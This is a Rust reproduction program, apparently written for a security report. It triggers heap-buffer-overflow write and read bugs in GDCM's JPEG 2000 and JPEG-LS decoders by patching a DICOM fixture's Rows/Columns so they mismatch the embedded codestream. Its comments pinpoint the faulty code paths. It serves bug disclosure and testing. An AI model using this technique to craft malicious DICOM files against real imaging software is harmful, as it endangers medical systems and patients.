//! Real, end-to-end reproduction using the public `dicom_pixeldata::PixelDecoder` API (the
//! `gdcm` feature, i.e. the exact FFI path `gdcm-rs`/vendored GDCM 3.1 uses) on a real
//! `pydicom` DICOM fixture opened through `dicom_object::open_file`, with only its `Rows`/
//! `Columns` header attributes patched through this crate's own public element-insertion
//! API (`put_element`) - the embedded compressed pixel data itself is left completely
//! untouched and genuinely valid.
//!
//! GDCM's own `Bitmap::GetBufferLength()` computes a declared buffer length purely from the
//! DICOM header's own `Rows`/`Columns`/`BitsAllocated`/`SamplesPerPixel`, entirely independent
//! of whatever the *actual* embedded JPEG 2000/JPEG-LS codestream really encodes. Two
//! different codec paths mishandle a mismatch between those two independent numbers, in two
//! different ways:
//!
//!  - `TryJPEG2000Codec`/`DecodeByStreamsCommon` (`gdcmJPEG2000Codec.cxx`) allocates its
//!    output buffer (`raw = new char[len]`) sized from the *declared* header dimensions
//!    (`Dimensions[0]*Dimensions[1]*...`), but fills it from a loop bounded by the *actual*
//!    decoded image's own dimensions (`image->comps[compno].w`/`h`, read straight from the
//!    real embedded codestream via OpenJPEG). If the DICOM header declares a *smaller* image
//!    than what's actually embedded, this is a straightforward heap-buffer-overflow **write**.
//!  - `TryJPEGLSCodec` (`gdcmBitmap.cxx`) computes `len = GetBufferLength()` from the
//!    *declared* header dimensions and does `memcpy(buffer, outbv->GetPointer(), len)`, where
//!    `outbv` is the actual decoded JPEG-LS output (self-consistently sized from the
//!    codestream's own embedded header, independent of `len`). The only guard is
//!    `assert(len <= outbv->GetLength())`, unlike the otherwise-analogous `TryJPEGCodec` which
//!    has a real *runtime* check (`if (len > outbv->GetLength()) return false;`). If the DICOM
//!    header declares a *larger* image than what's actually embedded, and assertions are
//!    compiled out (`NDEBUG`, i.e. any ordinary Release build of GDCM), this is a
//!    heap-buffer-overflow **read**.
//!
//! Run with `--variant jpeg2000` (default) or `--variant jpegls` to pick which one this
//! process demonstrates - each crashes the whole process (SIGSEGV/SIGABRT/glibc heap
//! corruption abort), so both can't be demonstrated in the same run.

use dicom_core::header::Tag;
use dicom_core::{DataElement, PrimitiveValue, VR};
use dicom_dictionary_std::tags;
use dicom_object::open_file;
use dicom_pixeldata::PixelDecoder;

fn main() {
    let variant = std::env::args().nth(1).unwrap_or_else(|| "jpeg2000".to_string());

    let (fixture, declared_rows_cols): (&str, u16) = match variant.as_str() {
        "jpeg2000" => ("pydicom/MR_small_jp2klossless.dcm", 32),
        "jpegls" => ("pydicom/MR_small_jpeg_ls_lossless.dcm", 256),
        other => {
            eprintln!("unknown variant {other:?}, expected \"jpeg2000\" or \"jpegls\"");
            std::process::exit(2);
        }
    };

    let test_file = dicom_test_files::path(fixture).unwrap();
    let mut obj = open_file(test_file).unwrap();

    let rows_before = obj.element(tags::ROWS).unwrap().to_int::<u16>().unwrap();
    let cols_before = obj.element(tags::COLUMNS).unwrap().to_int::<u16>().unwrap();
    println!(
        "variant={variant} fixture={fixture} real embedded codestream declares {rows_before}x{cols_before}, \
         patching DICOM header Rows/Columns to {declared_rows_cols}x{declared_rows_cols}"
    );

    obj.put_element(DataElement::new(
        Tag(0x0028, 0x0010),
        VR::US,
        PrimitiveValue::from(declared_rows_cols),
    )); // Rows
    obj.put_element(DataElement::new(
        Tag(0x0028, 0x0011),
        VR::US,
        PrimitiveValue::from(declared_rows_cols),
    )); // Columns

    println!("calling decode_pixel_data() via the gdcm feature's FFI path...");
    let result = obj.decode_pixel_data();
    // If we get here without the process being killed by a signal, the bug did not fire on
    // this run - print the outcome so a caller can tell reproduced-vs-not from stdout alone.
    println!("did not crash - decode_pixel_data() returned: {:?}", result.map(|d| d.data().len()));
}
